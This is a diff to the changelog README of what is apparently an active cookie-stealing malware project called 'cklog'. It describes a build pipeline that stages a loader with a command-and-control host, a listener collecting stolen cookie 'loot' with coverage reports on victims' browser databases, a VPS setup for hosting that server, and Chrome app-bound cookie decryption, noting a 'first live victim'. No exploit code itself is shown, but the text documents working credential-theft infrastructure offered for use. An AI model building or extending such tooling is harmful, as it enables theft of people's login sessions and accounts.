@@ -3,7 +3,45 @@
 
 ## What's New
 
-### v8 -- Chrome v20 app-bound pipeline, parser fix, first live victim (current)
+### v9 -- build.py, cklog package, coverage manifests, VPS bootstrap (current)
+
+**One command for the toolchain.** `build.py` is now the single entrypoint:
+`check`, `all`, `payload`, `keytool`, `verify`, `hash`, `stage`, `test`,
+`coverage`. It reads the loader slots through the shared PE module, stages
+`[loader][host][len][CKLG]` with structural checks, and refuses a C2 longer than
+the 256-byte slot. `install.ps1` is the build-box installer (python, deps,
+toolchain, build); `install.bat` now calls `python build.py all` and no longer
+skips the build on a clang-only install. The compiler detection that lived
+inside `auto.py` moved to `cklog/toolchain.py`.
+
+**`cklog/` package.** `pe.py`, `loot.py`, `coverage.py`, `toolchain.py` and
+`build.py`. `peutil.py` is a three-line shim, so `auto.py`/`pick.py` keep
+working unchanged. `listen.py` and `sink.py` now share record identity and the
+Netscape writer instead of carrying two copies that had drifted (sink kept the
+first value, listen the newest; both now say which one they mean).
+
+**Coverage manifests, attacker side.** The listener accepts the stage-2
+envelope `{"records": [...], "coverage": {...}}` in addition to the bare list
+every current payload sends, writes `loot/coverage.jsonl`, and exposes
+`/coverage`; `/health` reports the manifest count. A source row is one database
+file: browser, profile, path, rows, decrypted, failed, and a fixed skip reason
+(`missing`, `locked`, `no-key`, `v10-fail`, `unsupported`, `excluded`). The
+payload starts sending manifests in stage 2 -- until then a 960-cookie run still
+cannot tell you what it left on the table.
+
+**Listener bind and VPS.** `listen.py --bind 127.0.0.1` keeps the listener off
+the public interface. `deploy/vps/bootstrap.sh` installs Python + Caddy on
+Debian/Ubuntu, runs the listener under systemd bound to loopback, terminates
+TLS on 80/443 and opens 9415 only with `--plain` (the current payload speaks
+raw Winsock HTTP; schannel is stage 4).
+
+**Tests.** 24 stdlib unittest cases: PE sentinel selection against the real
+loader (including the `.text` immediate trap and the already-patched slot),
+merge identity for profiles/partitions/tokens/passwords, coverage normalization,
+and a real listener on a throwaway port that exercises both wire shapes.
+`python build.py test`.
+
+### v8 -- Chrome v20 app-bound pipeline, parser fix, first live victim
 
 **Chrome 127+ app-bound cookies now come out through Chrome's own elevation
 service.** The v20 key cannot be unwrapped in-process: `os_crypt.app_bound_encrypted_key`
